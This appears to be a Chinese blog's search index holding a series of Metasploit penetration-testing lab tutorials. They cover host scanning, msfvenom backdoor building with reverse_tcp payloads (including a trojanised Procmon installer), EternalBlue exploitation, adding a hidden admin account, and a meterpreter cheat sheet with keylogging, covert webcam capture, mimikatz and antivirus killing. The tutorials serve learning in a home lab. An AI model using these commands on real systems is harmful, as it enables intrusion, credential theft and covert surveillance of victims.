<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透（6）</title>
    <link href="/2024/09/06/6/"/>
    <url>/2024/09/06/6/</url>
    
    <content type="html"><![CDATA[<p>通过上一节可以看到永恒之蓝漏洞可以拿到最高权限，而之前提到的文件上传漏洞拿到的只是普通用户权限，最直观的感受就是普通用户不能通过<code>hashdump</code>获取目标主机的密码，这里就涉及到了提权，假设目标主机不存在永恒之蓝漏洞仅可以通过文件上传漏洞进行攻击：</p><p>待更~</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（5）</title>
    <link href="/2024/09/06/5/"/>
    <url>/2024/09/06/5/</url>
    
    <content type="html"><![CDATA[<p>为了防止频繁的sudo su，这里给root改密码，方便之后用root登录进行操作：<br><img src="/img/%E6%B8%97%E9%80%8F5.1.png" alt="图片" title="修改root密码方便之后操作"><br>永恒之蓝需要用的kali中msf模块里的ms17-010，这里的1号exp会比0号exp适用的版本更老：<br><img src="/img/%E6%B8%97%E9%80%8F5.3.png" alt="图片" title="利用search命令查看ms17-010"></p><p>首先利用auxiliary进行漏洞的检测判断是否存在这个漏洞,auxiliary模块在<a href="https://zxl.world/2024/09/02/2/">第二节</a>中提到了：<br><img src="/img/%E6%B8%97%E9%80%8F5.2.png" alt="图片" title="测试目标主机是否存在此漏洞，发现存在"></p><p>这里选用0号exp成功进行拿到shell：<br><img src="/img/%E6%B8%97%E9%80%8F5.4.png" alt="图片" title="设置好rhosts后run成功拿到shell"></p><p>由于永恒之蓝是系统内核级的缓冲区溢出漏洞，所以能直接拿到目标主机的最高权限，这里使用hashdump进行查看目标主机的用户的密码，可以在<a href="cmd5.com">cmd5网站</a>解密后查看原文：</p><p><img src="/img/%E6%B8%97%E9%80%8F5.5.png" alt="图片" title="查看加密后的密码"></p><p>拿到了最高权限之后这里就能进行之前<a href="https://zxl.world/2024/09/05/4/">第四节</a>提到的msf后渗透环节的一系列操作此处不一一赘述</p><p>此时可以直接输入shell进入到目标主机的shell，不过会出现乱码：<br><img src="/img/%E6%B8%97%E9%80%8F5.6.png" alt="图片" title="进入目标主机的shell"></p><p>解决办法：直接输入<code>chcp 65001</code>，可以发现乱码没了：<br><img src="/img/%E6%B8%97%E9%80%8F5.7.png" alt="图片" title="还有一点乱码..."></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">//创建新用户admin<br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;<span class="hljs-title">net</span> <span class="hljs-title">user</span> <span class="hljs-title">admin</span> <span class="hljs-title">admin123</span> /<span class="hljs-title">add</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br><span class="hljs-function"> </span><br><span class="hljs-function">//将其添加进管理员组中</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;<span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">administrators</span> <span class="hljs-title">admin</span> /<span class="hljs-title">add</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></td></tr></table></figure><p>可以看到永恒之蓝漏洞可以拿到最高权限，而之前提到的文件上传漏洞拿到的只是普通用户权限，最直观的感受就是普通用户不能通过<code>hashdump</code>获取目标主机的密码，这里就涉及到了提权，假设目标主机不存在永恒之蓝漏洞仅可以通过文件上传漏洞进行攻击，想看如何提权，请前往下一节。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（4）</title>
    <link href="/2024/09/05/4/"/>
    <url>/2024/09/05/4/</url>
    
    <content type="html"><![CDATA[<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>在Metasploit Framework（MSF）中，Meterpreter是一种强大的后渗透工具，用于在受攻击的系统上建立一个持久的、交互式的远程Shell。</p><p>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</p><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>这个部分介绍如何利用msf其中的后门生成功能将正常的软件改为后门软件，在受害者点击了之后便可以进行攻击。</p><p>这里使用Procmon64.exe，上传到opt目录之后，使用命令成功生成payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#替换为自己的ip和端口</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp -x /opt/Procmon64.exe -k lhost=192.168.56.132 lport=1689 -f exe &gt; /opt/procmon.exe<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.3.png" alt="图片" title="生成了带后门的procmon软件"></p><p>修改配置项，用我们生成的带后门的procmon软件进行攻击：</p><p><img src="/img/%E6%B8%97%E9%80%8F4.4.png" alt="图片" title="配置改为1689端口，成功拿到shell"></p><p>如果希望对方在关闭软件后，会话依然可以保留，就需要在建立会话之后，迅速进行进程迁移</p><p>进程迁移是指为了不被受害者发现自己被攻击了从而把攻击进程伪装起来，通常是把shell进程藏在别的正常的进程中让人不易察觉。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启自动迁移进程</span><br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> autorunscript migrate ‐f<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.5.png" alt="图片" title="成功迁移进程"><br>查看现在的进程号和迁移到的进程：</p><p><img src="/img/%E6%B8%97%E9%80%8F4.6.png" alt="图片" title="成功迁移到了进程号为1624的notepad进程"></p><h2 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h2><p>进入了meterpreter之后可以用 <code>help</code> 查看如何使用命令进行攻击</p><p>书接上文，拿到了meterpreter之后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bg</span> <span class="hljs-comment">#暂挂</span><br>sessions <span class="hljs-comment">#查看有哪些会话</span><br>sessions -i 序号 <span class="hljs-comment">#进入会话</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F4.1.png" alt="图片" title="进入和退出会话"></p><p>这里可以看到操作失败权限不够，之后会提到如何提权：</p><p><img src="/img/%E6%B8%97%E9%80%8F4.2.png" alt="图片" title="还有hashdump可以获取密码的加密后的值"></p><p>拿到了shell之后通常先将进程迁入到explorer.exe</p><p>“explorer.exe是Windows程序管理器或者文件资源管理器。它用于管理Windows图形壳，包括桌面和文件管理，删除该程序会导致Windows图形界面无法使用。资源管理器explorer.exe进程为用户提供了图形用户界面（也称为图形壳），简单的说就是用来显示系统的桌面环境，包括桌面图标和文件管理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">migrate explorer进程号<br></code></pre></td></tr></table></figure><p>其余常用命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi <span class="hljs-comment">#加载mimikatz模块，它可以用来提取 Windows 系统中的密码和凭据信息。</span><br>ps <span class="hljs-comment">#查看目标主机进程信息</span><br>getuid <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem <span class="hljs-comment">#自动帮你提权,获得的当前用户是administrator才能成功</span><br>run killav <span class="hljs-comment">#关闭系统自带的杀毒软件</span><br><span class="hljs-built_in">pwd</span> <span class="hljs-comment">#查看目标主机当前目录(windows)</span><br>getlwd <span class="hljs-comment">#查看本地的当前目录(Linux)</span><br>lcd <span class="hljs-comment">#更改本地工作目录</span><br>lls <span class="hljs-comment">#列出本地文件</span><br>lpwd <span class="hljs-comment">#打印本地工作目录</span><br><br>search ‐f <span class="hljs-string">&#x27;*.jsp&#x27;</span> ‐d <span class="hljs-string">&#x27;e:\&#x27;</span> <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download E:\test.txt /root <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload /root/test.txt d:\<span class="hljs-built_in">test</span> <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br>getpid <span class="hljs-comment">#查看当前Meterpreter Shell的进程PID</span><br>idletime <span class="hljs-comment">#查看主机运行时间</span><br><br>screenshot <span class="hljs-comment">#截图</span><br>webcam_list <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap <span class="hljs-comment">#拍照 ‐整个过程毫无查觉</span><br>webcam_stream <span class="hljs-comment">#开视频</span><br><br>execute 参数 ‐f 可执行文件 <span class="hljs-comment">#执行可执行程序</span><br><br>keyscan_start <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop <span class="hljs-comment">#停止键盘记录功能</span><br><br>uictl <span class="hljs-built_in">disable</span> keyboard <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl <span class="hljs-built_in">enable</span> keyboard <span class="hljs-comment">#允许目标使用键盘</span><br>uictl <span class="hljs-built_in">disable</span> mouse <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl <span class="hljs-built_in">enable</span> mouse <span class="hljs-comment">#允许目标使用鼠标</span><br><br>load <span class="hljs-comment">#加载扩展库</span><br>run <span class="hljs-comment">#使用扩展库</span><br>timestomp <span class="hljs-comment">#操作文件 MACE 属性</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从这里就可以看到不要乱下载软件和安装包，藏个后门在软件里面轻而易举，再进行一下进程迁移甚至都不知道自己的电脑被黑了。乱下载东西很容易就会把你的电脑上线被别人获取信息，特别是那些莫名其妙的软件园千万别去碰，因为不知道里面藏有什么，从功能那里可以看到能进行很多的操作。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（3）</title>
    <link href="/2024/09/03/3/"/>
    <url>/2024/09/03/3/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>首先要知道有什么主机才能进行接下来的操作</p><p>arp_sweep：使用arp请求枚举本地局域网中的所有活跃主机，arp的扫描能力还行，<strong>丢失信息较少</strong>。<br>udp_sweep：通过发送UDP数据包探查指定主机是否活跃，并发现主机上udp服务，<strong>丢失信息较多</strong>。</p><p>show missing 查看模块命令的必填项</p><p>show options 查看目前的配置项</p><p>set是局部配置只在当前模块下运行，setg是全局配置。</p><p>自己开三台虚拟机试一下就知道咯<br><img src="/img/%E6%B8%97%E9%80%8F3.1.png" alt="图片" title="arp扫描的结果，扫描到了部分的主机"><br><img src="/img/%E6%B8%97%E9%80%8F3.2.png" alt="图片" title="udp扫描的结果，什么都没扫描到不愧是udp"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>知道了有哪些主机之后就看主机的端口有哪些</p><p>search portscan分为三类，<strong>SYN</strong>用的最多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用发送TCP SYN标志的方式探测开放端口<br>auxiliary/scanner/protscan/syn<br>//通过一次完整的TCP连接来判断端口是否开放 最准确但是最慢<br>auxiliary/scanner/protscan/tcp<br>//一种更为隐秘的扫描方式，通过发送FIN，PSH，URG标志，能够躲避一些高级的TCP标记检器的过滤<br>auxiliary/scanner/protscan/xmas<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B8%97%E9%80%8F3.3.png" alt="图片" title="TCP端口扫描的配置，默认是扫描到10000端口"><br><img src="/img/%E6%B8%97%E9%80%8F3.4.png" alt="图片" title="TCP端口扫描的结果"></p><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p>确定开放端口后，对相应端口上所运行的服务信息进行挖掘</p><h4 id="利用SMB进行挖掘"><a href="#利用SMB进行挖掘" class="headerlink" title="利用SMB进行挖掘"></a>利用SMB进行挖掘</h4><p>首先枚举暴力破解账号密码：<br><img src="/img/%E6%B8%97%E9%80%8F3.5.png" alt="图片" title="成功爆破得到账号密码"><br>然后利用SMB获得目标主机的开启服务：<br><img src="/img/%E6%B8%97%E9%80%8F3.6.png" alt="图片" title="成功得到开启服务"></p><h4 id="利用telnet服务进行挖掘"><a href="#利用telnet服务进行挖掘" class="headerlink" title="利用telnet服务进行挖掘"></a>利用telnet服务进行挖掘</h4><p>首先需要目标主机开启了telent服务：<br><img src="/img/%E6%B8%97%E9%80%8F3.7.png" alt="图片" title="开启telent服务"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>知道了主机开启的端口和服务后可以进行漏洞的利用，所有的漏洞利用模块都在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/metasploit‐framework/modules/exploits<br></code></pre></td></tr></table></figure><p>在漏洞成功利用后，会与目标系统建立一个shell会话，此时就需要使用meterpreter进行后渗透 </p><h4 id="Payload的类型"><a href="#Payload的类型" class="headerlink" title="Payload的类型"></a>Payload的类型</h4><h5 id="singles"><a href="#singles" class="headerlink" title="singles"></a>singles</h5><p>是一种完全独立的payload，而且使用起来就像运行calc.exe一样简单，如：windows&#x2F;powershell_bind_tcp 就是一个 Single 类型的 payload，它使用 PowerShell 在目标系统上创建一个 TCP 服务，并监听一个端口，任何可以连接到该服务的客户端都可以与目标系统建立一个shell连接。</p><h5 id="stagers"><a href="#stagers" class="headerlink" title="stagers"></a>stagers</h5><p>传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind（正向）型和reverse（反向）型，bind型是需要攻击机主动连接目标端口的；而reverse型是目标机反连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。</p><p>这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。</p><p>一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。</p><h5 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h5><p>传输体载荷，在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。 如：meterpreter</p><p>stager和stage就像web入侵里面提到的小马和大马一样，由于exploit环境的限制，不能一下子把stage传过去，需要先传一个stager，stager在attacker和target之间建立网络连接，之后再把stage传过去进行下一步的行动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Single Payload的格式为：</span><br>&lt;target&gt;/ &lt;single&gt; 如：windows/powershell_bind_tcp<br><span class="hljs-comment">#Stager/Stage Payload的格式为：</span><br>&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt; 如：windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>Payload通常是结合exp来使用的</p><h5 id="常见的stager"><a href="#常见的stager" class="headerlink" title="常见的stager"></a>常见的stager</h5><h6 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h6><p>基于TCP的反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux/x86/meterpreter/reverse_tcp<br>windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h6 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h6><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows/meterpreter/reverse_https<br></code></pre></td></tr></table></figure><h6 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h6><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到攻击者的机器，所以在内网中经常会使用，不需要设置LHOST。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux/x86/meterpreter/bind_tcp<br>windows/meterpreter/bind_tcp<br></code></pre></td></tr></table></figure><h5 id="Payload的生成"><a href="#Payload的生成" class="headerlink" title="Payload的生成"></a>Payload的生成</h5><p>msfvenom — Metasploit 独立有效负载生成器，是用来生成后门的软件，在目标机上执行后门上线。<br>msfvenom提供了各种不同类型的有效载荷（payloads），其中涵盖了多个操作系统和使用环境，例如Android、IOS、Unix、Linux、Windows…等，用于在渗透测试和漏洞评估中利用系统漏洞、获取对目标系统的控制或执行特定的操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom ‐h <span class="hljs-comment">#可查看帮助信息</span><br>‐p：–payload，指定特定的 Payload，如果被设置为‐，那么从标准输入流中读取。几乎支持全平台。 指定操作系统<br>‐l：–list，列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all<br>‐n：–nopsled，指定 nop在 payload中的数量<br>‐f：–format，指定 Payload的输出格式（–‐list：列出所有可用的输出格式） php exe<br>‐e：–encoder，指定使用编码的encoder，用于免杀，X86/shikata_ga_nai是最流行的编码，Rank等级为excellent；解码<br>和编码过程都是随机生成的；cmd/powershell_base64也为excellent；<br>‐a：–<span class="hljs-built_in">arch</span>，指定目标系统架构 arm‐安卓 x86 mips工业系统‐路由器‐交换机<br>‐‐platform：指定目标系统平台 linux windows ios 安卓<br>‐s：–space，设置未经编码的 Payload的最大长度（–encoder‐space：编码后的 Payload的最大长度）<br>‐b：–bad‐chars，设置需要在 Payload中避免出现的字符，例如：’\0f’、’\x00’等<br>‐i：–iterations，设置 Payload的编码次数，理论上讲，编码的次数越高，免杀效果会越好<br>‐‐smallest：尽可能生成最短的 Payload<br>‐o：–out，保存 Payload到文件<br>‐c：–add‐code，指定一个附加的win32 shellcode文件<br>‐x：–template，指定一个特定的可执行文件作为模板<br>-k：–keep，保持模板程序的功能，注入的payload作为一个新的进程运行<br></code></pre></td></tr></table></figure><h5 id="一些类型的Payload"><a href="#一些类型的Payload" class="headerlink" title="一些类型的Payload"></a>一些类型的Payload</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">php：<br>msfvenom ‐p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.php<br>jsp：<br>Msfvenom ‐p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.jsp<br>python：<br>msfvenom ‐p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐fraw &gt; shell.py<br>bash：<br>msfvenom ‐p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.sh<br></code></pre></td></tr></table></figure><p>这里用msfvenom生成一个后门exe程序去获取反弹shell：<br><img src="/img/%E6%B8%97%E9%80%8F3.8.png" alt="图片" title="编码三次生成后门exe程序，payload为591字节、总的为7168字节，位置在文件系统的opt目录下面叫qq.exe"></p><p>实测下来经过了三次编码的后门程序不能运行，这里在生成后门的时候把编码删除就可以了，不过编码了免杀效果更强</p><p>lhost和lport是Metasploit Framework中的两个重要的配置选项,它们分别指定了本地主机的IP地址和端口号</p><p>生成好了之后要想办法上传到目标主机，在攻击机本地需要进行端口的监听，这里需要用到multi&#x2F;handler</p><p>本地测试的时候可以用vmware tools拖入拖出，kali一般会自带，win7可以参考：<a href="https://blog.csdn.net/weixin_45729764/article/details/134133548">这篇博客</a></p><p>一般来说在win7装好后会是普通版因为没有密钥，这里可以用破解工具或者直接用升级密钥，普通版会少很多东西，比如administartor的用户组就看不到 </p><p>win7普通版升级为旗舰版的激活密钥：6K2KY-BFH24-PJW6W-9GK29-TMPWP（好像一直能用</p><p><img src="/img/%E6%B8%97%E9%80%8F3.9.png" alt="图片" title="我的配置项，成功实施了攻击"></p><p>随后进入到meterpreter后渗透模块…</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（2）</title>
    <link href="/2024/09/02/2/"/>
    <url>/2024/09/02/2/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>首先了解MSF，刚入门实力达不到自己写exp、payload所以就先当脚本小子，后面慢慢去熟悉其中的原理和利用细节。</p><h3 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h3><p>目前最流行、最强大、最具扩展性的渗透测试平台软件基于Metasploit进行渗透测试和漏洞分析的。</p><p>框架集成了渗透测试标准 (PTES） 思想一定程度上统一了渗透测试和漏洞研究的工作环境新的攻击代码可以比较容易的加入框架开发活跃版本更新频繁（每周）早期版本基于社区力量维护，被 Rapid 7收购后打造出其商业版产品目前分化为四个版本，社区版本依然十分活跃。</p><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。</p><p>通俗理解就是MSF里面集成好了各种exp，可以当脚本小子直接用。</p><h3 id="MSF分类"><a href="#MSF分类" class="headerlink" title="MSF分类"></a>MSF分类</h3><p><img src="/img/%E6%B8%97%E9%80%8F2.1.png" alt="图片" title="MSF的不同版本"><br>有这几种不同的版本，在kali里面用终端的免费版就够了。</p><h3 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h3><p>MSF所有的漏洞测试都是基于模块。</p><h4 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h4><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块。</p><p>辅助模块能在渗透之前得到目标系统丰富的情报信息，从而发起更具目标性的精准攻击。包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码口令破解、敏感信息嗅探、fuzz、实施网络协议欺骗等模块。</p><h4 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h4><p>利用系统漏洞进行攻击的动作，用于利用漏洞和传递有效负载的模块。有远程漏洞利用、本地漏洞利用、权限提升漏洞利用、客户端漏洞利用、Web 应用程序漏洞利用和许多其他漏洞。metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。</p><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p>成功exploit之后，真正在目标系统执行的代码或指令。比如反弹shell的代码。分为3种类型的payload，分别是single、stages、和stagers。<br>single：一个完整的payload，不需要外部库，all-in-one<br>stager：目标计算机内存有限，先传输一个较小的payload用于建立连接<br>stages：利用stager建立的连接下载后续的payloadstager与stages有多种类型，适用于不同场景，shellcode是特殊的payload，其主要用于与目标主机建立shell。<br><img src="/img/%E6%B8%97%E9%80%8F2.2.png" alt="图片" title="payload"><br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Stager/Stage Payload的格式为：</span><br>&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt; 如：windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure></p><h4 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h4><p>编码器模块主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统用于有效负载编码和加密的模块，例如 base64、XOR、shikata_ga_nai 等。这有助于混淆以规避防病毒或NIDS（网络入侵检测系统）、EDR（端点检测和响应）等防御。</p><p>各大厂商已经针对msf做了防御，免杀需要额外进行编码加壳。</p><h4 id="nops"><a href="#nops" class="headerlink" title="nops"></a>nops</h4><p>metasploit框架中的空指令模块，用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。</p><h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击，安装后门、记录键盘记录、屏幕捕获等操作。</p><h4 id="evasion"><a href="#evasion" class="headerlink" title="evasion"></a>evasion</h4><p>躲避模块，用来生成免杀payload 用于规避防御的模块，例如防病毒规避、AppLocker 绕过、软件限制策略 (SRP) 绕过等。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透（1）</title>
    <link href="/2024/09/02/1/"/>
    <url>/2024/09/02/1/</url>
    
